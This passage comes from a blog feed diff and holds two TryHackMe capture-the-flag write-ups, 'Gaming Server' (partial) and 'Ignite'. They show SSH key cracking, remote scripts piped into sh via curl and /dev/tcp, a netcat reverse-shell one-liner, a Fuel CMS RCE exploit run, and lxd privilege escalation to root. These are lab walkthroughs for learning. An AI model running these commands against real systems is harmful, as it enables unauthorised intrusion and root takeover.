+  <li><img src="/assets/img/tryhackme/gamingserver/manifesto.png" alt="manifesto" /></li>
+</ul>
+
+<p>meme.jpg :  :D</p>
+
+<ul>
+  <li><img src="/assets/img/tryhackme/gamingserver/meme.png" alt="meme" /></li>
+</ul>
+
+<p>Now let’s go to the /secret/ directory and check it out.</p>
+
+<p><img src="/assets/img/tryhackme/gamingserver/secret.png" alt="secret" /></p>
+
+<p>We found a secretKey file, let’s see what it says.</p>
+
+<p><img src="/assets/img/tryhackme/gamingserver/rsa.png" alt="rsa" /></p>
+
+<p>Hah, we probably found the RSA key file for john 
+We can crack this RSA key and enter ssh with the password we reach.</p>
+
+<p>First, let’s copy the secretKey and create the id_rsa file.</p>
+
+<p><img src="/assets/img/tryhackme/gamingserver/pass.png" alt="pass" /></p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ nano id_rsa
+$ ssh2john id_rsa &gt; id_rsa.hash
+$ john --wordlist=/usr/share/wordlists/rockyou.txt id_rsa.hash
+</code></pre></div></div>
+
+<p><strong><code class="language-plaintext highlighter-rouge">Password: *****</code></strong></p>
+
+<p>Now we can log in to ssh.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ chmod 600 id_rsa
+$ ssh -i id_rsa john@10.10.225.113
+</code></pre></div></div>
+
+<p><img src="/assets/img/tryhackme/gamingserver/in.png" alt="in" /></p>
+
+<p>Now we can get to the user flag.</p>
+
+<p><img src="/assets/img/tryhackme/gamingserver/user-flag.png" alt="user-flag" /></p>
+
+<p><br /></p>
+
+<h3 id="12-roottxt">1.2 Root.txt</h3>
+
+<p>I’m scanning the system with <a href="https://github.com/carlospolop/PEASS-ng/releases/tag/20230319">linpeas.sh</a> to upgrade privileges.</p>
+
+<p>First, I run the following code in the directory where linpeas.sh is located on my own machine.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ sudo python -m http.server 80
+</code></pre></div></div>
+
+<p>Then I run the following code on the target machine.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ curl 10.8.86.168/linpeas.sh | sh
+</code></pre></div></div>
+
+<p><img src="/assets/img/tryhackme/gamingserver/run.png" alt="run" /></p>
+
+<p>And it worked. Now we’re waiting to see if we can find anything useful.</p>
+
+<p><img src="/assets/img/tryhackme/gamingserver/linpeas.png" alt="linpeas" /></p>
+
+<p>I think we found something about lxd. I don’t know if I can upgrade authorization using this. So I started researching.</p>
+
+<p>Yes, I found a way to escalate, let’s do it.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ git clone https://github.com/saghul/lxd-alpine-builder
+$ cd lxd-alpine-builder
+$ ./build-alpine 
+</code></pre></div></div>
+
+<p><img src="/assets/img/tryhackme/gamingserver/alpine.png" alt="alpine" /></p>
+
+<p>After building, we need to send one of the <code class="language-plaintext highlighter-rouge">*.tar.gz</code> files created on our machine to the target machine.</p>
+
+<p><img src="/assets/img/tryhackme/gamingserver/tar.png" alt="tar" /></p>
+
+<p>For this, I run the following code on my own machine.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ python -m http.server 80
+</code></pre></div></div>
+
+<p>This code on the target machine:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ wget http://10.8.86.168/alpine-v3.13-x86_64-20210218_0139.tar.gz
+</code></pre></div></div>
+
+<p>Then we continue on the target machine.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ lxc image import ./alpine-v3.13-x86_64-20210218_0139.tar.gz --alias myimage
+$ lxd init # hepsine enter tıklayıp geç.
+$ lxc init myimage mycontainer -c security.privileged=true
+$ lxc config device add mycontainer mydevice disk source=/ path=/mnt/root recursive=true 
+$ lxc start mycontainer
+$ lxc exec mycontainer /bin/sh
+</code></pre></div></div>
+
+<p><img src="/assets/img/tryhackme/gamingserver/privesc.png" alt="privesc" /></p>
+
+<p>We can get to the root flag.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ find / -type f -name root.txt 2&gt;/dev/null
+$ cat /mnt/root/rot/root.txt
+</code></pre></div></div>
+
+<p><img src="/assets/img/tryhackme/gamingserver/root-flag.png" alt="root-flag" /></p>
+
+<p><br /></p>
+
+<hr />
+
+<p><br /></p>
+
+<p>It was such a fun CTF. I hope you learned something and had fun too. But that’s it for now till next time take care.</p>
+
+<p><br /></p>]]></content><author><name>Mr0Wido&apos;s Blog</name><email>mr0wido@protonmail.com</email></author><category term="TryHackMe" /><category term="lxd," /><category term="ssh2john," /><category term="security" /><summary type="html"><![CDATA[An Easy Boot2Root box for beginners. Let’s start.]]></summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="http://localhost:4000/assets/img/gamingserver.jpeg" /><media:content medium="image" url="http://localhost:4000/assets/img/gamingserver.jpeg" xmlns:media="http://search.yahoo.com/mrss/" /></entry><entry><title type="html">TryHackMe - Ignite</title><link href="http://localhost:4000/tryhackme-ignite/" rel="alternate" type="text/html" title="TryHackMe - Ignite" /><published>2023-03-20T00:00:00+03:00</published><updated>2023-03-20T00:00:00+03:00</updated><id>http://localhost:4000/tryhackme-ignite</id><content type="html" xml:base="http://localhost:4000/tryhackme-ignite/"><![CDATA[<p>A new start-up has a few issues with their web server.. Let’s start.</p>
+
+<p><br /></p>
+
+<h2 id="1-ignite">1. Ignite</h2>
+
+<p>Root the box! Designed and created by DarkStar7471, built by Paradox.
+Enjoy the room! For future rooms and write-ups, follow @darkstar7471 on Twitter.</p>
+
+<p><br /></p>
+
+<h3 id="11-usertxt">1.1 User.txt</h3>
+
+<p>Let’s do a nmap scan first.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ nmap -sSCV -A -O 10.10.80.114
+</code></pre></div></div>
+
+<p><img src="/assets/img/tryhackme/ignite/nmap.png" alt="nmap" /></p>
+
+<p>Only port 80/tcp is open. If we look carefully, there is a directory information in <strong><code class="language-plaintext highlighter-rouge">robots.txt</code></strong>. Disallow: <strong><code class="language-plaintext highlighter-rouge">/fuel/</code></strong>.</p>
+
+<p><img src="/assets/img/tryhackme/ignite/robots.png" alt="robots" /></p>
+
+<p>But first, let’s check the website running on port 80. 
+Here is a page like this.</p>
+
+<p><img src="/assets/img/tryhackme/ignite/home.png" alt="home" /></p>
+
+<p>As far as I can see, the fuel cms version 1.4 is used here.
+There may be a vulnerability in this version, we will check it, but first I want to look at the /fuel/ directory.
+Let’s go to this directory and see what comes up.</p>
+
+<p><img src="/assets/img/tryhackme/ignite/login.png" alt="login" /></p>
+
+<p>An admin login page appears. By default I tried <strong><code class="language-plaintext highlighter-rouge">admin:admin</code></strong> directly and logged in D:
+I didn’t expect the admin page to be so easy to reach. Let’s see what we find here.</p>
+
+<p><img src="/assets/img/tryhackme/ignite/fuel.png" alt="fuel" /></p>
+
+<p>I’m checking every link on the page to see if we can somehow apply a reverse shell.
+But I couldn’t find anything remarkable. So I searched in exploit-db if we can find a vulnerability about fuel cms v1.4 that we discovered earlier.</p>
+
+<p><img src="/assets/img/tryhackme/ignite/search.png" alt="search" /></p>
+
+<p>We found something important here. I see that we can exploit the RCE vulnerability in 1.4. Let’s take a look at the most recent of them.</p>
+
+<p><img src="/assets/img/tryhackme/ignite/db.png" alt="db" /></p>
+
+<p>I’m downloading the exploit file from here. And now let’s run it.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ python 50477.py -u http://10.10.9.177
+</code></pre></div></div>
+
+<p><img src="/assets/img/tryhackme/ignite/payload.png" alt="payload" /></p>
+
+<p>We log in to the system, and we provide a clearer connection by using one of the <a href="https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet">pentest monkey’s reverse shells</a>.</p>
+
+<p><img src="/assets/img/tryhackme/ignite/monkey.png" alt="monkey" /></p>
+
+<p>First, we set up a netcat listener on our own machine.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ nc -nlvp 4444
+</code></pre></div></div>
+
+<p>Then we enter the following code on the target machine.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.8.86.168 4444 &gt;/tmp/f
+</code></pre></div></div>
+
+<p>And we are inside.</p>
+
+<p><img src="/assets/img/tryhackme/ignite/in.png" alt="in" /></p>
+
+<p>To find user.txt, I first look at the user directories in the /home directory. There is a user and that is www-data. We go in and take the flag right away.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ ls -la /home
+$ ls -la /home/www-data
+$ cat /home/www-data/user.txt
+</code></pre></div></div>
+
+<p><img src="/assets/img/tryhackme/ignite/user-flag.png" alt="user-flag" /></p>
+
+<p><br /></p>
+
+<h3 id="12-roottxt">1.2 Root.txt</h3>
+
+<p>I’m scanning the system with <a href="https://github.com/carlospolop/PEASS-ng/releases/tag/20230319">linpeas.sh</a> to upgrade privileges.</p>
+
+<p>First, I run the following code in the directory where linpeas.sh is located on my own machine.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ sudo nc -q 5 -lvnp 80 &lt; linpeas.sh
+</code></pre></div></div>
+
+<p>Then I run the following code on the target machine.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ cat &lt; /dev/tcp/10.8.86.168/80 | sh
+</code></pre></div></div>
+
+<p><img src="/assets/img/tryhackme/ignite/run.png" alt="run" /></p>
+
+<p>And it worked. Now we’re waiting to see if we can find anything useful.</p>
+
+<p><img src="/assets/img/tryhackme/ignite/linpeas.png" alt="linpeas" /></p>
+
+<p><strong><code class="language-plaintext highlighter-rouge">Password: ******</code></strong></p>
+
+<p>We found a password information, but I don’t know what it is for. But let’s try it for root.</p>
+
+<p>First, let’s call a shell using python. Then let’s try logging in.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ python -c 'import pty; pty.spawn("/bin/bash")'
+$ su root
+Password: ******
+</code></pre></div></div>
+
+<p>It worked :D. We have successfully rooted.</p>
+
+<p><img src="/assets/img/tryhackme/ignite/privesc.png" alt="privesc" /></p>
+
+<p>Now we can get to root.txt let’s get the flag.</p>
+
+<p><img src="/assets/img/tryhackme/ignite/root-flag.png" alt="root-flag" /></p>
+
+<p><br /></p>
+
+<hr />
+
+<p><br /></p>
+
+<p>It was such a fun CTF. I hope you learned something and had fun too. But that’s it for now till next time take care.</p>
+
+<p><br /></p>]]></content><author><name>Mr0Wido&apos;s Blog</name><email>mr0wido@protonmail.com</email></author><category term="TryHackMe" /><category term="ctf," /><category term="privesc," /><category term="exploit" /><summary type="html"><![CDATA[A new start-up has a few issues with their web server.. Let’s start.]]></summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="http://localhost:4000/assets/img/ignite.png" /><media:content medium="image" url="http://localhost:4000/assets/img/ignite.png" xmlns:media="http://search.yahoo.com/mrss/" /></entry></feed>
